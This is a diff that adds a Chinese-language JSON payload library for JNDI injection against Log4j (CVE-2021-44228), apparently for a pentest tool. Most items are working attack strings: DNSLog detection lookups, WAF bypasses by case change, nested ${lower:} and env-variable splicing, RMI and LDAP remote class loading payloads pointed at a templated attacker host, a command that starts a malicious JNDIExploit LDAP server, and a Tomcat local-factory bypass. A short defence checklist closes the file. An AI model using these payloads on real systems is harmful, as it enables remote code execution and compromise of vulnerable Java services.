@@ -1,0 +1,129 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "JNDI 注入 / Log4j",
+  "categories": ["探测与识别", "LDAP 利用", "RMI 利用", "绕过技巧", "工具与防御"],
+  "items": [
+    {
+      "id": "jndi-ldap-dnslog",
+      "title": "LDAP 带外探测",
+      "category": "探测与识别",
+      "code": "${jndi:ldap://{{domain}}/a}",
+      "desc": "Log4j2 等组件解析 ${} 时会发起 JNDI 请求，通过 DNSLog 判断是否存在漏洞。",
+      "tags": ["jndi", "log4j", "dnslog", "detect"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "CVE-2021-44228 公开分析"
+    },
+    {
+      "id": "jndi-lowercase",
+      "title": "协议名大小写绕过",
+      "category": "绕过技巧",
+      "code": "${jndi:LDAP://{{domain}}/a}",
+      "desc": "部分 WAF 只匹配小写 ldap 关键字，可改用大写或混合大小写的协议名绕过。",
+      "tags": ["jndi", "bypass", "waf"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开 Log4j 绕过研究"
+    },
+    {
+      "id": "jndi-lookup-nested",
+      "title": "嵌套 ${lower:} 绕过",
+      "category": "绕过技巧",
+      "code": "${jndi:${lower:l}${lower:d}a${lower:p}://{{domain}}/a}",
+      "desc": "利用 Log4j 支持的嵌套求值拆分关键字，绕过字符串匹配。",
+      "tags": ["jndi", "log4j", "bypass"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开 Log4j 绕过研究"
+    },
+    {
+      "id": "jndi-env-bypass",
+      "title": "环境变量拼接",
+      "category": "绕过技巧",
+      "code": "${jndi:${env:JAVA_HOME:-l}dap://{{domain}}/a}",
+      "desc": "利用 env 默认值语法拼接协议名，规避关键字检测。",
+      "tags": ["jndi", "log4j", "bypass"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开 Log4j 绕过研究"
+    },
+    {
+      "id": "jndi-ldap-remote-class",
+      "title": "LDAP 远程类加载",
+      "category": "LDAP 利用",
+      "code": "启动恶意 LDAP 服务：java -jar JNDIExploit.jar -i {{ip}} -p 8888",
+      "desc": "配合恶意 LDAP 服务返回远程 codebase，触发目标加载并执行类。需要 JDK 版本满足条件。",
+      "tags": ["jndi", "ldap", "exploit"],
+      "vars": ["ip"],
+      "risk": "danger",
+      "source": "JNDIExploit 公开项目"
+    },
+    {
+      "id": "jndi-rmi-remote-class",
+      "title": "RMI 远程类加载",
+      "category": "RMI 利用",
+      "code": "${jndi:rmi://{{ip}}:1099/Exploit}",
+      "desc": "RMI 协议同样可触发远程类加载，JDK 8u121 后默认关闭 codebase。",
+      "tags": ["jndi", "rmi", "exploit"],
+      "vars": ["ip"],
+      "risk": "danger",
+      "source": "公开 JNDI 注入研究"
+    },
+    {
+      "id": "jndi-local-factory",
+      "title": "本地工厂类利用",
+      "category": "LDAP 利用",
+      "code": "${jndi:ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho}",
+      "desc": "高版本 JDK 无法远程加载时，可尝试利用目标本地已有的工厂类实现命令执行。",
+      "tags": ["jndi", "ldap", "bypass", "jdk"],
+      "vars": [],
+      "risk": "danger",
+      "source": "公开 JNDI 注入研究"
+    },
+    {
+      "id": "jndi-http-protocol",
+      "title": "HTTP 协议探测",
+      "category": "探测与识别",
+      "code": "${jndi:http://{{domain}}/a}",
+      "desc": "部分场景只允许 LDAP/RMI，但 http 协议也可用于确认解析行为。",
+      "tags": ["jndi", "http", "detect"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开 Log4j 分析"
+    },
+    {
+      "id": "jndi-header-points",
+      "title": "常见注入点",
+      "category": "探测与识别",
+      "code": "User-Agent / X-Forwarded-For / Referer / Origin / username / 搜索关键字",
+      "desc": "凡是会被日志组件记录的字段，都可能成为 JNDI 注入入口。",
+      "tags": ["jndi", "checklist", "header"],
+      "vars": [],
+      "risk": "low",
+      "source": "CVE-2021-44228 公开分析"
+    },
+    {
+      "id": "jndi-dnslog-command",
+      "title": "DNSLog 平台自建提示",
+      "category": "工具与防御",
+      "code": "使用自建 dnslog 平台（如 dnslog.cn 类服务）接收解析记录",
+      "desc": "第三方平台可能记录敏感信息，建议使用自建或可信平台。",
+      "tags": ["jndi", "dnslog", "tool"],
+      "vars": [],
+      "risk": "low",
+      "source": "通用实践"
+    },
+    {
+      "id": "jndi-defense",
+      "title": "防御验证要点",
+      "category": "工具与防御",
+      "code": "1. 升级 Log4j 至安全版本  2. 关闭 lookup  3. 限制出站请求  4. 禁用 JNDI 远程加载",
+      "desc": "验证修复是否到位时逐项检查，避免只升级未加固。",
+      "tags": ["jndi", "defense", "checklist"],
+      "vars": [],
+      "risk": "low",
+      "source": "Apache Log4j 安全公告"
+    }
+  ]
+}
